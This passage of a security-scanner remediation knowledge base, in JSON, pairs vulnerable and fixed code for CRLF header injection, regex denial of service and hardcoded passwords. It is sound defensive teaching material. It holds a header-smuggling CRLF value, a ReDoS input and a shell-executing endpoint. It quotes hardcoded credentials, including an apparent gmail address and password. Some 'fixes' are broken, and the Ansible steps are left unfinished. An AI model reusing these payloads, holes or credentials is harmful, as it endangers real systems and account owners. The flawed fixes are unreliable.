LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\t\t\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tif(res.equals(&quot;success&quot;))\n\t\t{\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Welcome &quot; + bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); \n\t\t\t\n\t\t\tHttpSession session = request.getSession();\n\t\t    session.setAttribute(&quot;userRole&quot;, bean.getRoleID());\n\t\t    session.setAttribute(&quot;userName&quot;, bean.getUserName());\n\n\t\t\t<em class=\"red\">Cookie userRole = new Cookie(&quot;userRole&quot;, bean.getRoleID());\n\t\t\tuserRole.setHttpOnly(true);\n\t\t\tuserRole.setSecure(true);\n\t\t\tresponse.addCookie(userRole);\n\t\t\t\n\t\t</em>\t<em class=\"red\">Cookie userName = new Cookie(&quot;userName&quot;, bean.getUserName());</em>\n\t\t\tuserName.setHttpOnly(true); \n\t\t\tuserName.setSecure(true);\n\t\t\tresponse.addCookie(userName);\n\n\t\t\treturn new ModelAndView(&quot;success&quot;, &quot;loginBean&quot;, bean);\n\t\t}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\t\t\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tif(res.equals(&quot;success&quot;))\n\t\t{\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Welcome &quot; + bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); \n\t\t\t\n\t\t\tHttpSession session = request.getSession();\n\t\t    session.setAttribute(&quot;userRole&quot;, bean.getRoleID());\n\t\t    session.setAttribute(&quot;userName&quot;, bean.getUserName());\n\n\t\t\t<em class=\"blue\">Cookie userRole = new Cookie(&quot;userRole&quot;, URLEncoder.encode(bean.getUserRole(),&quot;UTF-8&quot;));</em>\n\t\t\tuserRole.setHttpOnly(true);\n\t\t\tuserRole.setSecure(true);\n\t\t\tresponse.addCookie(userRole);\n\t\t\t\n\t\t\t<em class=\"blue\">Cookie userName = new Cookie(&quot;userName&quot;, URLEncoder.encode(bean.getUserName(),&quot;UTF-8&quot;));</em>\n\t\t\tuserName.setHttpOnly(true); \n\t\t\tuserName.setSecure(true);\n\t\t\tresponse.addCookie(userName);\n\n\t\t\treturn new ModelAndView(&quot;success&quot;, &quot;loginBean&quot;, bean);\n\t\t}", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header (e.g., filename+char(13)+char(10)+X-XSS-Protection: 0 to use the cookie data to create a new header line and disable XSS protection). \nNever trust the user input in response header. Change the user cookie to contain only valid characters, and always perform a validation and sanitization of the values (e.g. by using urlEncoder.encode())\n\nOther methods of protection include performing validation against whitelist of data.\n\nFor reference: \nhttps://exploitbyte.com/crlf-injection/\nhttps://www.geeksforgeeks.org/crlf-injection-attack/\nhttps://docs.oracle.com/javase/7/docs/api/java/net/URLEncoder.html\nhttps://owasp.org/www-community/attacks/HTTP_Response_Splitting", "impact": "In case of validation/sanitization, check for special characters that are allowed to be part of the input value.\nTest the output on cookie names and possible values, including the POST and GET methods. For example: URLEncoder.encode changes the space character &quot; &quot; to the plus sign &quot;+&quot; instead of %20, and this is valid only for application/x-www-form-urlencoded URL, after the ? in the URL (e.g., https://www.eg.com/page?q=val+val2+val3)", "abstract": "Use of URLEncoder"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Login_HeaderManipulation(string userName, string password,string rememberMe)\n        {\n            if (ModelState.IsValid)\n            {\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n\n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;,userName));\n\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if (DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if (dr[&quot;Password&quot;].ToString() == password)\n                            {\n                                Session[&quot;role&quot;] = &quot;Admin&quot;;\n                                Session[&quot;FirstName&quot;] = &quot;Admin&quot;;\n                                Session[&quot;LastName&quot;] = &quot;Admin&quot;;\n\n                                HttpCookie cookie = new HttpCookie(&quot;VulnerableApp&quot;, <em class=\"red\">rememberMe</em>);\n                                Response.Cookies.Add(cookie);\n\n                                if (Request.QueryString[&quot;ReturnUrl&quot;] != null)\n                                    FormsAuthentication.RedirectFromLoginPage(userName, true);\n                                else\n                                    return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n            }\n\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            logger.Info(&quot;Invalid Credentials for username=&quot; + userName);\n            return View();\n        }", "nonvulncode": "public ActionResult Login_HeaderManipulation(string userName, string password, string rememberMe)\n        {\n            if (ModelState.IsValid)\n            {\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n\n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;, userName));\n\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if (DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if (dr[&quot;Password&quot;].ToString() == password)\n                            {\n                                Session[&quot;role&quot;] = &quot;Admin&quot;;\n                                Session[&quot;FirstName&quot;] = &quot;Admin&quot;;\n                                Session[&quot;LastName&quot;] = &quot;Admin&quot;;\n                                string sanitizeRememberMe = <em class=\"blue\">AntiXssEncoder.UrlEncode(AntiXssEncoder.HtmlEncode(rememberMe, true));</em>\n                                HttpCookie cookie = new HttpCookie(&quot;VulnerableApp&quot;, sanitizeRememberMe);\n                                Response.Cookies.Add(cookie);\n\n                                if (Request.QueryString[&quot;ReturnUrl&quot;] != null)\n                                    FormsAuthentication.RedirectFromLoginPage(userName, true);\n                                else\n                                    return View(&quot;Main&quot;);\n                            }\n\n                        }\n                    }\n                }\n                conn.Close();\n            }\n\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            logger.Info(&quot;Invalid Credentials for username=&quot; + userName);\n            return View();\n        }", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header \n(example., hacker+char(13)+HTTP/1.1 200 OK...). One option is to never trust the user input by applying URL And HTML Encoding, which will sanitize the cookie. We can use the AntiXssEncoder to encode the input. We need to import the System.Web.Security.AntiXss to used this assembly.\n\nOther methods of protection include performing validation against whitelist of data.\n\nFor reference: \nhttps://docs.microsoft.com/en-us/dotnet/api/system.net.webutility.urlencode?view=net-5.0\nhttps://docs.microsoft.com/en-us/dotnet/api/system.web.security.antixss.antixssencoder?view=netframework-4.8\nhttps://exploitbyte.com/crlf-injection/\nhttps://www.geeksforgeeks.org/crlf-injection-attack/\nhttps://docs.oracle.com/javase/7/docs/api/java/net/URLEncoder.html\nhttps://owasp.org/www-community/attacks/HTTP_Response_Splitting", "impact": "In case of validation/sanitization, check for special characters that are allowed to be part of the input value.\nTest the output on cookie names and possible values, including the POST and GET methods. For example: URLEncoder.encode changes the space character &quot; &quot; to the plus sign &quot;+&quot; instead of %20, and this is valid only for application/x-www-form-urlencoded URL, after the ? in the URL (e.g., https://www.eg.com/page?q=val+val2+val3)", "abstract": "Use of AntiXssEncoder to sanitize input"}]}, "mitigations": {"mitigation": {"system": "Application server", "configuration": "N/A", "backend": null, "frontend": null, "comments": "This vulnerability has been fixed in most modern application servers, regardless of what language the code has been written in. Check the application server version and test if it is vulnerable to CR/LF attacks.\nReference: https://owasp.org/www-community/attacks/HTTP_Response_Splitting"}}}}}, "Denial of Service: Regular Expression": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00393", "function": "java.lang.String.replaceFirst()", "line": "503", "snippet": "String appendQuotes = \"'\"+firstChar;\n\t\t\tString firstVal = Character.toString(firstChar);\n\t\t\tsanitizedData = data.replaceFirst(firstVal, appendQuotes);\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00394", "function": "java.lang.String.matches()", "line": "708", "snippet": "String[] inputCmd = cmd.split(\" \");\n\t\t\n\t\tisCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -> wlcmd.matches(inputCmd[0]));\t\t\n\t\t\n\t\tif (isCmdValid) {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00395", "function": "java.lang.String.matches()", "line": "781", "snippet": "String[] inputCmd = cmd.split(\" \");\n\t\t\n\t\tisCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -> wlcmd.matches(inputCmd[0]));\t\t\n\t\t\n\t\tif (isCmdValid) {"}]}], "remediation": {"remediation": {"@id": "R.0139", "@name": "Denial of Service: Regular Expression", "@dateLastModified": "1/22/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        public ActionResult ValidateEmail(string valEmailAddress)\n        {\n            string EmailRegex =<em class=\"red\"> @&quot;^([0-9a-zA-Z]([-.\\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\\w]*[0-9a-zA-Z]\\.)+[a-zA-Z]{2,9})$&quot;;</em>\n            var regEx = new Regex(EmailRegex);\n            bool valid = regEx.IsMatch(valEmailAddress);\n            \n\n            if (valid)\n                messages.Add(&quot;Email Address is valid.&quot;);\n            else\n                messages.Add(&quot;Emall Address is not valid.&quot;);\n\n            \n            return View(&quot;ValidateEmail&quot;,messages);\n     }", "nonvulncode": "[HttpPost]\n        public ActionResult ValidateEmail(string valEmailAddress)\n        {\n            try\n            {\n                string EmailRegex = @&quot;^([0-9a-zA-Z]([-.\\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\\w]*[0-9a-zA-Z]\\.)+[a-zA-Z]{2,9})$&quot;;\n                var regEx = new Regex(EmailRegex, RegexOptions.None, <em class=\"blue\">TimeSpan.FromSeconds(5)</em>);\n                bool valid = regEx.IsMatch(valEmailAddress);\n                if (valid)\n                    messages.Add(&quot;Email Address is valid.&quot;);\n                else\n                    messages.Add(&quot;Emall Address is not valid.&quot;);\n\n            }catch(RegexMatchTimeoutException ex)\n            {\n                messages.Add(&quot;Timeout: Email validation reach the timeout limit.&quot; + ex.Message);\n            }\n            return View(&quot;ValidateEmail&quot;,messages);\n        }", "comments": "On the non vulnerable code we specify the timeout in the regular expression object. Once the processing reach on the timeout limit the processing will stop and will throw a timeout exception. This is only available on starting .Net 4.5 framework which provide overload that allows you to enter a timeout.\n\nWith the code example given, the non vulnerable code on the 2nd example took 0 milliseconds to validate the example input below.\n- aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! -&gt; <em class=\"bold\">timed out</em>\n- angelolimdaguil@acn.com -&gt; <em class=\"bold\">0 milliseconds</em>\n\nFor vulnerable code .\n- aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! -&gt; <em class=\"bold\">1822393(ms) -&gt; 30 minutes</em>\n- angelolimdaguil@acn.com -&gt; <em class=\"bold\">1 (ms)</em>\n\nAn attacker can submit multiple invalid inputs to the application, causing a DoS on the server (overloaded processing regexps).\n\nPerformance may vary on the spec of the computer on where the application deployed.\n\nWe recommend is to change any regular expression and put a timeout in using the Regex.\n\nReference:\nhttps://dzone.com/articles/regular-expressions-denial", "impact": "needs to fine tune the timeout value to the production characteristics. The value cannot be too small that is not able to perform validations when running in production full load, and not too long to allow attackers to exploit. This value may be different on different cluster nodes, in case those are of different HW specs. \n\nNote: Many security scanners will keep detecting this as an issue after the fix. this is correct as it assumes the developers and security teams needs to agree on the timeout strategy in use before closing the issue on the security scanner as a &quot;fixed by design&quot;.", "abstract": "Use of timespan"}, {"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        public ActionResult ValidateEmail(string valEmailAddress)\n        {\n            string EmailRegex =<em class=\"red\"> @&quot;^([0-9a-zA-Z]([-.\\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\\w]*[0-9a-zA-Z]\\.)+[a-zA-Z]{2,9})$&quot;;</em>\n            var regEx = new Regex(EmailRegex);\n            bool valid = regEx.IsMatch(valEmailAddress);\n            \n\n            if (valid)\n                messages.Add(&quot;Email Address is valid.&quot;);\n            else\n                messages.Add(&quot;Emall Address is not valid.&quot;);\n\n            \n            return View(&quot;ValidateEmail&quot;,messages);\n     }", "nonvulncode": "[HttpPost]\n        public ActionResult ValidateEmail(string valEmailAddress)\n        {\n            try\n            {\n                string EmailRegex = <em class=\"blue\">@&quot;^[\\w-\\.]{1,}\\@([\\w]{1,}\\.){1,}[a-z]{2,4}$&quot;</em>;\n                var regEx = new Regex(EmailRegex);\n\n                bool valid = regEx.IsMatch(valEmailAddress);\n\n                if (valid)\n                    messages.Add(&quot;Email Address is valid.&quot;);\n                else\n                    messages.Add(&quot;Emall Address is not valid.&quot;);\n\n            }\n            catch (RegexMatchTimeoutException ex)\n            {\n                messages.Add(&quot;Timeout: Email validation reach the timeout limit.&quot; + ex.Message);\n            }\n            return View(&quot;ValidateEmail&quot;, messages);\n        }", "comments": "Complex Regexps need to be avoided or simplified. In this example, the vulnerable code is not optimized and will use more CPU time on the server to validate the email. In the non-vulnerable code, the expression is simplified. \n\nAn attacker can submit multiple invalid inputs to the application, causing a DoS on the server (overloaded processing regexps).\n\nPerformance may vary on the spec of the computer on where the application deployed.\n\nWe recommend is to optimize any regular expression and when possible, add a timeout in using the Regex.\n\nReference:\nhttps://dzone.com/articles/regular-expressions-denial", "impact": "No impact", "abstract": "Use of simpler Regexps"}, {"@type": "JAVA/JSP", "vulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView executeCommand( @RequestParam(value=&quot;cmd&quot;)String cmd) {\n\t\tModelAndView mv = new ModelAndView();\n\t\tList&lt;String&gt; dirList = new ArrayList&lt;String&gt;();\n\t\t<em class=\"red\">boolean isCmdValid = Pattern.matches(&quot;^[a-zA-Z0-9. /:]{2,25}$&quot;, cmd);</em>\n\t\tList&lt;String&gt; whiteListCmd = Arrays.asList(&quot;cd&quot;,&quot;dir&quot;,&quot;type&quot;); \n\t\tString[] inputCmd = cmd.split(&quot; &quot;);\n\t\t\n\t\t<em class=\"red\">isCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -&gt; wlcmd.matches(inputCmd[0]));</em>\t\t\n\t\t\n\t\tif (isCmdValid) {\n\t\t\tString commandArray[] = { &quot;cmd&quot;, &quot;/c&quot;, cmd, &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles&quot; };\n\t\t\ttry {\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;\n\t\t\t\twhile (true) {\n\t\t\t\t\tline = r.readLine();\n\t\t\t\t\tif (line==null) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tSystem.out.println(line);\n\t\t\t\t\tdirList.add(line);\n\t\t\t\t}\n\t\t\t\tr.close();\n\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\tmv.addObject(&quot;dirlist&quot;, dirList);\n\t\t\t}", "nonvulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView executeCommandWithMatcher (@RequestParam(value=&quot;cmd&quot;)String cmd) throws InterruptedException {\n\t\tlogger.debug(&quot;Command Execution started&quot;);\n\t\tModelAndView mv = new ModelAndView();\n\t\tList&lt;String&gt; dirList = new ArrayList&lt;String&gt;();\n\t\tPattern pattern = Pattern.compile(&quot;^[a-zA-Z0-9. /:]{2,25}$&quot;);\n\t\t\n\t\t<em class=\"blue\">Runnable runnable = new Runnable() {\n\t         @Override\n\t         public void run()\n\t         {\n\t            long startTime = System.currentTimeMillis();\n\t            Matcher interruptableMatcher = pattern.matcher(new InterruptibleCharSequence(cmd));\n\t            interruptableMatcher.find(); \n\t            System.out.println(&quot;Regex took:&quot; + (System.currentTimeMillis() - startTime) + &quot;ms&quot;);\n\t         }\n\t      };\n\n\t      Thread thread = new Thread(runnable);\n\t      thread.start();\n\n\t      Thread.sleep(50000); //in milliseconds\n\t      thread.interrupt();\t\n\t\t\n\t\tList&lt;String&gt; whiteListCmd = Arrays.asList(&quot;cd&quot;,&quot;dir&quot;,&quot;type&quot;); \n\t\tString[] inputCmd = cmd.split(&quot; &quot;);\n\t\t\n\t\tisCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -&gt; wlcmd.matches(inputCmd[0]));\t\t\n\t\t\n\t\tif (isCmdValid) {\n\t\t\tString commandArray[] = { &quot;cmd&quot;, &quot;/c&quot;, cmd, &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles&quot; };\n\t\t\ttry {\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t\t\t\tString line;\n\t\t\t\twhile (true) {\n\t\t\t\t\tline = r.readLine();\n\t\t\t\t\tif (line==null) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tSystem.out.println(line);\n\t\t\t\t\tdirList.add(line);\n\t\t\t\t}\n\t\t\t\tr.close();\n\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\tmv.addObject(&quot;dirlist&quot;</em>, dirList);\n\t\t\t}\n\n<em class=\"bold\"> InterruptibleCharSequence.java</em>\npublic class InterruptibleCharSequence implements CharSequence {\n\t   CharSequence inner;\n\n\t   public InterruptibleCharSequence(CharSequence inner) {\n\t      super();\n\t      this.inner = inner;\n\t   }\n\n\t <em class=\"blue\">  @Override\n\t   public char charAt(int index) {\n\t      if (Thread.currentThread().isInterrupted()) {\n\t         throw new RuntimeException(&quot;Interrupted!&quot;);\n\t      }\n\t      return inner.charAt(index);\n\t   }</em>\n\n\t   @Override\n\t   public int length() {\n\t      return inner.length();\n\t   }\n\n\t   @Override\n\t   public CharSequence subSequence(int start, int end) {\n\t      return new InterruptibleCharSequence(inner.subSequence(start, end));\n\t   }\n\n\t   @Override\n\t   public String toString() {\n\t      return inner.toString();\n\t   }\n\t}", "comments": "Matching untrusted data with regexp might lead to the pattern matcher running for long, which causes the application to hang. Introducing thread to interrupt if the regexp runs for long will prevent from Denial of Service attack.\n\nFor reference:\nhttps://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS", "impact": "needs to fine tune the timeout value to the production characteristics. The value cannot be too small that is not able to perform validations when running in production full load, and not too long to allow attackers to exploit. This value may be different on different cluster nodes, in case those are of different HW specs. \n\nNote: Many security scanners will keep detecting this as an issue after the fix. this is correct as it assumes the developers and security teams needs to agree on the timeout strategy in use before closing the issue on the security scanner as a &quot;fixed by design&quot;.", "abstract": "Use of Thread interrupt"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Password Management: Hardcoded Password": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmailConfiguration.java", "items": [{"id": "IN00396", "function": "setPassword()", "line": "21", "snippet": "mailSender.setUsername(\"gurupriyat@gmail.com\");\n\t    mailSender.setPassword(\"pri@din23\");\n\t    \n\t    Properties props = mailSender.getJavaMailProperties();"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00397", "function": "VariableAccess: passwdArray", "line": "173", "snippet": "try {\n\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(\"pwd\").toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00398", "function": "put()", "line": "1102", "snippet": "env.put(Context.PROVIDER_URL, \"LDAP://ldap.forumsys.com:389/cn=read-only-admin,dc=example,dc=com\");\n\t\tenv.put(Context.SECURITY_PRINCIPAL, \"uid=tesla,dc=example,dc=com\");\n\t\tenv.put(Context.SECURITY_CREDENTIALS, \"password\");\n\t\ttry {\n\t\t\tctx = new InitialDirContext(env);"}]}], "remediation": {"remediation": {"@id": "R.0040", "@name": "Password Management: Hardcoded Password", "@dateLastModified": "1/15/2021", "faqs": {"faq": {"question": "But the code needs the password to connect to the DB. There is no difference on the connection, is this insecure?", "answer": "The code is usually shared amongst many different teams: developers, administrators, and sometimes even external people providing support for the application. It is a good practice to store the password in an external configuration file, where there can be security restrictions in place. Another recommendation is to change the configuration file automatically when deploying to production, reducing any human intervention on the config file that contains the system passwords"}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Departments()\n        {\n\n            using (SqlConnection con = new SqlConnection(&quot;Data Source= localhost; Integrated Security=true;Initial Catalog=MVC_VulnerableApp; uid=sa; Password=<em class=\"red\">Mysapassword01</em>; &quot;))\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;,con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                    while (reader.Read())\n                    {\n                        Department department = new Department();\n                        department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                        department.Name = reader[&quot;Name&quot;].ToString();\n                        listDepartments.Add(department);\n                    }\n                    return View(listDepartments);\n                }\n            }\n        }", "nonvulncode": "public ActionResult Departments()\n        {\n          using (SqlConnection con = new SqlConnection(<em class=\"blue\">ConfigurationManager.ConnectionStrings[&quot;VulnerableApp&quot;].ToString()</em>))\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;,con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                    while (reader.Read())\n                    {\n                        Department department = new Department();\n                        department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                        department.Name = reader[&quot;Name&quot;].ToString();\n                        listDepartments.Add(department);\n                    }\n                 \n                    return View(listDepartments);\n                }\n            }\n        }", "comments": "Putting hardcoded password in the code is not a good practice because anyone who has access to the code may exploit the access directly. This can be considered a data breach in case someone outside the organization (e.g. contractors mantaining the code) has temporary access to the hardcoded confidential information. Even if the code that was leak is the compiled one this can be decompiled using a tools like dotPeek, .Net Reflect etc\n\nAll privileges and system accounts need to be protected.", "impact": "Setup a configuration file (app.config, web.config), that stores the encrypted password or connection strings on it, and protect the configuration files from unauthorized access. For reference, see: \n *  https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/connection-strings-and-configuration-files \n *  https://docs.microsoft.com/en-us/iis/manage/configuring-security/using-encryption-to-protect-passwords \n\nThe production configuration and Dev/FQA configuration files are usually different, and needs to be managed/replaced when deploying to production as a step in the Change Management process. \n\nRecommendation is to change the configuration file automatically when deploying to production, as part of the CD pipeline, reducing any human intervention on the config file that contains the system passwords", "abstract": "Use of configuration file"}, {"@type": "JAVA/JSP", "vulncode": "LoginDAO.java\npublic List&lt;UserAccountBean&gt; listUser() throws SQLException, NamingException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\t\n\t\tConnection conn = null;\n\t\tFileNotFoundException exception =null;\nconn = DriverManager.getConnection(<em class=\"red\">&quot;jdbc:sqlserver://localhost:1433;databaseName=VulnAppDB&quot;,&quot;AdminDB&quot; , &quot;admindb&quot;</em>);\n\t\t\tStatement stmt = conn.createStatement();\n\n\t\t\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\t\t\t\tResultSet rs = stmt.executeQuery(sql);\n\n\t\t\t\twhile (rs.next()) {\n\t\t\t\t\tUserAccountBean userAccount = new UserAccountBean();\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\t\t\tGuardedString gs = new GuardedString(rs.getString(&quot;Password&quot;).toCharArray());\t\n\t\t\t\t\tuserAccount.setPwd(gs);\n\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\tlistUsers.add(userAccount);\n\t\t\t\t}", "nonvulncode": "public List&lt;UserAccountBean&gt; listUser() throws SQLException, NamingException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\tConnection conn = null;\n\t\tFileNotFoundException exception =null;\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\t<em class=\"blue\">String dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\nconn = DriverManager.getConnection(dbURL,dbuser ,dbpwd);\n\t\t\tStatement stmt = conn.createStatement();\n\n\t\t\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\n\t\t\t\tResultSet rs = stmt.executeQuery(sql);\n...\n}\n</em>", "comments": "Putting hardcoded password in the code is not a good practice because anyone who access to the code may exploit the access directly. This can be considered a data breach in case someone outside the organization (e.g. contractors mantaining the code) has temporary access to the hardcoded confidential information. Even if the code that was leak is the compiled one this can be decompiled using a tools like decaf, jd-gui etc\n\nAll privileges and system accounts need to be protected.", "impact": "Setup a configuration file (app.config, web.config), that stores the encrypted password or connection strings on it, and protect the configuration files from unauthorized access. For reference, see: \n\nThe production configuration and Dev/FQA configuration files are usually different, and needs to be managed/replaced when deploying to production as a step in the Change Management process.\n\nRecommendation is to change the configuration file automatically when deploying to production, as part of the CD pipeline, reducing any human intervention on the config file that contains the system passwords", "abstract": "Use of configuration file"}]}, "mitigations": {"mitigation": [{"system": "Web Server / IIS", "configuration": "IIS Manager interface", "backend": "1.Open the IIS Management Console (INETMGR.MSC).\n2.Open the Application Pools node underneath the machine node. Select the application pool you want to change to run under an automatically generated application pool identity.\n3.Right click the application pool and select Advanced Settings.\n4.Select the Identity list item and click the ellipsis (the button with the three dots).\n5.Select the Built-in account button, and then select the identity type ApplicationPoolIdentity from the combo box.\n\nvia Command Line :\n%windir%\\system32\\inetsrv\\appcmd.exe set AppPool &lt;your AppPool&gt; -processModel.identityType:ApplicationPoolIdentity", "frontend": "see backend code section", "comments": "On IIS, create a new application pool Identity, to store system credentials on it. Protect the encryption providers properly. \nWorker processes in IIS 6.0 and in IIS 7 run as Network Service by default. Network Service is a built-in Windows identity. It doesn't require a password and has only user privileges; that is, it is relatively low-privileged. Running as a low-privileged account is a good security practice because in case of an attack, a software bug can not be used by a malicious user to compromise the system without a privilege escalation, the last easier to be detected by SIEM tools.\n\nfor reference\nhttps://docs.microsoft.com/en-us/iis/manage/configuring-security/using-encryption-to-protect-passwords \nhttps://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities"}, {"system": "Ansible", "configuration": "ansible.cfg", "backend": "Install on Windows:\nhttps://geekflare.com/ansible-installation-windows/\n\nInstall on Linux/Ubuntu:\n$ sudo apt update\n$ sudo apt install software-properties-common\n$ sudo apt-add-repository --yes --update ppa:ansible/ansible\n$ sudo apt install ansible\n\nReference: https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html#installing-ansible-on-ubuntu\n\nCredential workflow. Instead of having credentials in the application, the recommended workflow is similar to:\n1) Application requires a credential to connect to the service (e.g. DB connection string)\n2) In Ansible, there is configured a vault including the credentials for all services used or called by application\n3) Application request to Ansible Valut the credentials, providing the ?????\n4) ????", "frontend": "Ex1.\nansible-vault encrypt_string --vault-password-file a_password_file 'foobar' --name 'the_secret'\n\nEx2.\nansible-vault encrypt_string --vault-id dev@a_password_file 'foooodev' --name 'the_dev_secret'", "comments": "Ansible Vault encrypts variables and files so you can protect sensitive content such as passwords or keys rather than leaving it visible as plaintext in playbooks or roles. \nTo use Ansible Vault you need one or more passwords to encrypt and decrypt content. \nIf you store your vault passwords in a third-party tool such as a secret manager, you need a script to access them. Use the passwords with the ansible-vault command-line tool to create and view encrypted variables, create encrypted files, encrypt existing files, or edit, re-key, or decrypt files. You can then place encrypted content under source control and share it more safely.\nYou can use encrypted variables and files in ad-hoc commands and playbooks by supplying the passwords you used to encrypt them. You can modify your ansible.cfg file to specify the location of a password file or to always prompt for the 